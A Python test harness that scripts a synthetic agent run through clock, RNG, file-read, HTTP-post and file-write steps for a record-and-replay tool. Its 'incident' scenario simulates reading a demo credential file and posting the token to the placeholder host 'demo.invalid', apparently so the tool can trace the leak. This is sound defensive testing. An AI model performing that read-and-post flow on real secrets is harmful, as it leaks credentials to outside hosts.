"""A deterministic agent used to exercise real record and replay boundaries."""

from dataclasses import dataclass
from hashlib import sha256
from hmac import new as hmac_new

from sentinel_replay.boundary import BoundarySession
from sentinel_replay.canonical import event_digest


@dataclass(frozen=True)
class ScriptedRun:
    actions: int
    scenario: str
    signature: str
    outbound_request: bool


def run_scripted_agent(session: BoundarySession, *, allow_live: bool, scenario: str) -> ScriptedRun:
    """Run a synthetic five-boundary trajectory, with no live replay fallback."""
    if scenario not in {"incident", "benign"}:
        raise ValueError(f"unknown scripted scenario: {scenario}")
    actions: list[dict[str, object]] = []

    def boundary(
        kind: str,
        call_id: str,
        request: object,
        response: object,
        evidence: dict[str, object],
    ) -> object:
        observed = session.call(
            kind,
            call_id,
            request,
            (lambda: response) if allow_live else None,
            evidence=evidence,
        )
        actions.append({"kind": kind, "call_id": call_id, "request": request, "response": observed})
        return observed

    tick = boundary(
        "clock", "clock-1", {"operation": "now"}, "2026-01-01T00:00:00Z", {"operation": "clock"}
    )
    draw = boundary(
        "rng", "rng-1", {"operation": "randint", "lo": 0, "hi": 99}, 7, {"operation": "rng"}
    )
    if tick != "2026-01-01T00:00:00Z" or draw != 7:
        raise ValueError("clock or RNG boundary returned an invalid response")
    source_path = "/demo/credential.txt" if scenario == "incident" else "/demo/public.txt"
    source_value = "DEMO_TOKEN_001" if scenario == "incident" else "public-status"
    # This fixed key is for synthetic data only. Production needs a secret key.
    carrier = hmac_new(
        b"sentinel-replay-synthetic-demo-only", source_value.encode(), sha256
    ).hexdigest()
    source = boundary(
        "tool",
        "source-read-1",
        {"tool": "read_file", "path": source_path},
        {"value": source_value},
        {
            "operation": "read_file",
            "resource": source_path,
            "sensitivity": "secret" if scenario == "incident" else "public",
            "carrier": carrier,
            "carrier_role": "source",
        },
    )
    if not isinstance(source, dict) or not isinstance(source.get("value"), str):
        raise ValueError("source boundary returned an invalid response")
    host = "demo.invalid" if scenario == "incident" else "internal.demo.invalid"
    response = boundary(
        "tool",
        "network-post-1",
        {"tool": "http_post", "host": host, "body": source["value"]},
        {"status": 200},
        {"operation": "http_post", "host": host, "carrier": carrier, "carrier_role": "sink"},
    )
    if not isinstance(response, dict) or response.get("status") != 200:
        raise ValueError("network boundary returned an invalid response")
    result = boundary(
        "tool",
        "artifact-write-1",
        {"tool": "write_file", "path": "/demo/report.txt", "content": "complete"},
        {"accepted": True},
        {
            "operation": "write_file",
            "resource": "/demo/report.txt",
            "depends_on": "network-post-1",
        },
    )
    if not isinstance(result, dict) or result.get("accepted") is not True:
        raise ValueError("artifact boundary returned an invalid response")
    session.assert_complete()
    return ScriptedRun(
        actions=len(actions),
        scenario=scenario,
        signature=event_digest(actions),
        outbound_request=scenario == "incident",
    )
